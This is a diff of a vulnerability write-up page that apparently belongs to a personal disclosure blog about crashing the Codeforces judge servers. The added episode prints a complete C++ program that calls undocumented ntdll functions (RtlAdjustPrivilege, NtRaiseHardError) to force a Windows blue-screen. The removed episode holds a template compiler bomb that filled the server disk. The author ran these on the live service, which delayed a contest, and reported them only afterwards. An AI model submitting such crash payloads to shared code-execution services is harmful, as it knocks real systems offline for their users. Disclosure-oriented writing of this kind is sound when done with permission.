@@ -5,9 +5,9 @@
     <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="description" content="How it all started!">
-<meta name="keywords" content=" start">
-<title>The Start | Documentation for vulnerabilties found by Khaled Mohamed</title>
+<meta name="description" content="Taking down the server again!">
+<meta name="keywords" content=" fall">
+<title>The Fall | Documentation for vulnerabilties found by Khaled Mohamed</title>
 <link rel="stylesheet" href="css/syntax.css">
 
 
@@ -132,7 +132,7 @@
 
 
 
-  <a class="email" title="Submit feedback" href="#" onclick="javascript:window.location='mailto:?subject=Breaking Down feedback&body=I have some feedback about the The Start page: ' + window.location.href;"><i class="fa fa-envelope-o"></i> Feedback</a>
+  <a class="email" title="Submit feedback" href="#" onclick="javascript:window.location='mailto:?subject=Breaking Down feedback&body=I have some feedback about the The Fall page: ' + window.location.href;"><i class="fa fa-envelope-o"></i> Feedback</a>
 
 </li>
 
@@ -150,7 +150,7 @@
                                 searchInput: document.getElementById('search-input'),
                                 resultsContainer: document.getElementById('results-container'),
                                 dataSource: 'search.json',
-                                searchResultTemplate: '<li><a href="{url}" title="The Start">{title}</a></li>',
+                                searchResultTemplate: '<li><a href="{url}" title="The Fall">{title}</a></li>',
                     noResultsText: 'No results found.',
                             limit: 10,
                             fuzzy: true,
@@ -256,7 +256,7 @@
         <!-- Content Column -->
         <div class="col-md-9" id="tg-sb-content">
             <div class="post-header">
-   <h1 class="post-title-main">The Start</h1>
+   <h1 class="post-title-main">The Fall</h1>
 </div>
 
 
@@ -264,7 +264,7 @@
 <div class="post-content">
 
    
-    <div class="summary">How it all started!</div>
+    <div class="summary">Taking down the server again!</div>
    
 
     
@@ -295,55 +295,57 @@ $('#toc').on('click', 'a', function() {
 
     
 
-  <h2 id="prolouge">Prolouge:</h2>
+  <h2 id="episode-2">Episode 2:</h2>
+<p>So far I have managed to uncover that there is some issues with how the submission codes are being executed but we don’t necessarily know what. However, the behavior of the simple process-killing hinted that some permissions aren’t set correctly.</p>
 
-<p>It was a quiet night and I had just woken up from a not very comfortable sleep. As always, I open up Codeforces.com and check what people are saying and look for a problem to solve. However, something was different. I was very irritated, I had failed to solve one dynamic programming challenge and I was pissed off. It was time for codeofrces to be put to rest. Or so I thought.</p>
+<p>Now since it’s windows another thing to note is that processes aren’t really important. What matters more are the users under which these processes are running. From what I understood about codeforces was that you send the code to a router and then it sends that to a virtual machine on which the checking takes place. We would assume that this virtual machine is logged in as a user with the lowest possible privileges, and we’d be wrong.</p>
 
-<h2 id="epilouge">Epilouge:</h2>
+<p>Last time we used MS C# .NET. Well, now we’ll get serious. Let’s use C++ and let’s try to use WINAPI too. Scary, isn’t it?</p>
 
-<p>Codeforces is the biggest programming contests platform right now, but that didn’t matter. To me, codeforces was just software that ran untrusted code. I saw an opportunity. I write some code and they run it ON THEIR MACHINES! I thought to myself, how hard could it be to break this website when I hypothetically could feed the host with all the bad stuff you can think of? I was a naive but not far from the truth.</p>
+<p>At this point, I didn’t really care much about knowing the exact details of what things were wrong. I wanted to take down the servers again. Just like I mentioned in <a href="./breakingdown_start.html">Episode 1</a> we know that we killed the processes using C#’s wrapper of the WINAPI so why not use the winapi directly?</p>
 
-<p>For some context, codeforces has a field that let’s you send some code after specifying in which language/compiler your code wants to use and it’s compiled and then ran on some server and you’re passed the response to see. Basic stuff that online judges do.</p>
+<p>I thought about something I read in the past about an undocumented function in the winapi that crashes your OS.
+This function is <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtRaiseHardError.html">NtRaiseHardError</a> which you can read more about online as I will try to keep this related to Codeforces and not why Microsoft sucks.</p>
 
-<figure><a class="no_icon" target="_blank" href="https://codeforces.com/problemset/customtestm"><img class="docimage" src="images/cf_codearea.png" alt="codearea" /></a><figcaption>Codeforces' Code Area</figcaption></figure>
+<p>Let’s remember how this code looked like and boom:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
+#include &lt;ntstatus.h&gt;
+</span>
+<span class="cp">#define OPTION_SHUTDOWN 6
+#define SHUTDOWN_PRIVILEGE 19
+</span>
+<span class="k">typedef</span> <span class="n">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span><span class="n">pdef_RtlAdjustPrivilege</span><span class="p">)</span> <span class="p">(</span>
+		<span class="n">ULONG</span> <span class="n">privilege</span><span class="p">,</span>
+		<span class="n">BOOLEAN</span> <span class="n">enable</span><span class="p">,</span>
+		<span class="n">BOOLEAN</span> <span class="n">current_thread</span><span class="p">,</span>
+		<span class="n">PBOOLEAN</span> <span class="n">enabled</span><span class="p">);</span>
+<span class="k">typedef</span> <span class="n">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span><span class="n">pdef_NtRaiseHardError</span><span class="p">)(</span>
+		<span class="n">NTSTATUS</span> <span class="n">error_status</span><span class="p">,</span>
+		<span class="n">ULONG</span> <span class="n">number_of_parameters</span><span class="p">,</span>
+		<span class="n">ULONG</span> <span class="n">unicode_string_parameter_mask</span><span class="p">,</span>
+		<span class="n">PULONG_PTR</span> <span class="n">parameters</span><span class="p">,</span>
+		<span class="n">ULONG</span> <span class="n">response_option</span><span class="p">,</span>
+		<span class="n">PULONG</span> <span class="n">reponse</span><span class="p">);</span>
 
-<p>The first thing that came to my mind was trying to break the compiler. I remembered an article I had read about compiler bombs and decided to try that and see if they had correct compiler flags that could prevent such a trivial problem from occuring and to my surprise: they did not!</p>
-
-<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define Z struct X
-#define T template &lt;int N
-</span><span class="n">T</span><span class="p">,</span> <span class="kt">int</span> <span class="n">M</span> <span class="o">=</span> <span class="n">N</span> <span class="o">&gt;</span> <span class="n">Z</span><span class="p">;</span>
-
-<span class="k">struct</span> <span class="n">Y</span> <span class="p">{</span>
-	<span class="k">static</span> <span class="kt">int</span> <span class="n">f</span><span class="p">()</span> <span class="p">{</span>
-		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="p">}</span>
-<span class="p">};</span>
-
-<span class="n">T</span> <span class="o">&gt;</span> <span class="n">Z</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">,</span> <span class="mi">0</span> <span class="o">&gt;:</span> <span class="n">Y</span> <span class="p">{};</span>
-<span class="n">T</span> <span class="o">&gt;</span> <span class="n">Z</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">,</span> <span class="n">N</span> <span class="o">&gt;:</span> <span class="n">Y</span> <span class="p">{};</span>
-<span class="n">T</span><span class="p">,</span> <span class="kt">int</span> <span class="n">M</span> <span class="o">&gt;</span> <span class="n">Z</span> <span class="p">{</span>
-<span class="k">static</span> <span class="kt">int</span> <span class="n">f</span><span class="p">()</span> <span class="p">{</span>
-	<span class="k">static</span> <span class="kt">int</span> <span class="n">x</span><span class="p">[</span><span class="mi">100000</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
-			<span class="n">X</span> <span class="o">&lt;</span> <span class="n">N</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span>
-			<span class="n">M</span> <span class="o">&gt;</span> <span class="o">::</span><span class="n">f</span><span class="p">()</span> <span class="o">+</span> <span class="n">X</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">,</span>
-			<span class="n">M</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="o">::</span><span class="n">f</span><span class="p">()</span>
-	<span class="p">};</span>
-<span class="p">}</span>
-<span class="p">};</span>
-<span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="n">X</span> <span class="o">&lt;</span><span class="mi">80</span><span class="o">&gt;</span> <span class="o">::</span><span class="n">f</span><span class="p">();</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span> 
+	<span class="n">pdef_RtlAdjustPrivilege</span> <span class="n">RtlAdjustPrivilege</span> <span class="o">=</span> <span class="p">(</span><span class="n">pdef_RtlAdjustPrivilege</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"RtlAdjustPrivilege"</span><span class="p">);</span>
+	<span class="n">BOOLEAN</span> <span class="n">enabled</span><span class="p">;</span>
+	<span class="n">pdef_NtRaiseHardError</span> <span class="n">NtRaiseHardError</span> <span class="o">=</span> <span class="p">(</span><span class="n">pdef_NtRaiseHardError</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtRaiseHardError"</span><span class="p">);</span>
+	<span class="n">ULONG</span> <span class="n">response</span><span class="p">;</span>
+	<span class="n">NtRaiseHardError</span><span class="p">(</span><span class="n">STATUS_NOT_IMPLEMENTED</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">OPTION_SHUTDOWN</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">response</span><span class="p">);</span>
+    <span class="c1">// RIP Machine...
+</span><span class="p">}</span>
 </code></pre></div></div>
 
-<p>The idea behind this was that I knew the above code generated a huge object file by creating too many segments(more than 2^16 - 1) and that the server where this code was compiled had to have some sort of size limit. I was both right and wrong. After sending the code to the server I got a return that said:</p>
+<p>The server on which the submissions are processed is now dead. Again. The thing is, I am here confused on why I can call things like <code class="highlighter-rouge">LoadLibrary</code> and <code class="highlighter-rouge">GetProcAddress</code> and <code class="highlighter-rouge">ntdll.dll</code> seriously? However, I am a good guy and I send Mike a message with my latest find.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Can't compile file:
-C:\Users\CONTES~1\AppData\Local\Temp\ccQIO7Gm.s: Assembler messages:
-C:\Users\CONTES~1\AppData\Local\Temp\ccQIO7Gm.s: Fatal error: cannot fill 256 bytes in section .data$_ZZN1XILi76ELi76EE1fEvE1x of C:\Users\CONTES~1\AppData\Local\Temp\ccOE4Zfv.o because: 'No space left on device'
-C:\Users\CONTES~1\AppData\Local\Temp\ccQIO7Gm.s: Fatal error: can't close C:\Users\CONTES~1\AppData\Local\Temp\ccOE4Zfv.o: No space left on device
-</code></pre></div></div>
+<h2 id="disclosure">Disclosure:</h2>
+<p><strong>On August 24th 2018</strong>: I sent Mike a message on Facebook (we’re best friends now, I guess?) and I realized I messed up. A contest was about to start in 5 minutes and the server just died on him (must have been bad).</p>
 
-<p>Which was good that I was able to hault the checker from cleaning the temp files and now I can just keep sending codes to somehow deplete the server’s storage. That was too lame and I had to dig deeper.</p>
+<p>We wait until the contest ends and discuss some causes that might be the root of all this. Oh, the contest was delayed by 15 minutes (sorry everyone).</p>
+
+<p><strong>August 25th 2018</strong>: The code no longer works, good right? Nah, Mike was lazy (so lazy infact). You’ll know why in the next episode.</p>
 
 
     <div class="tags">
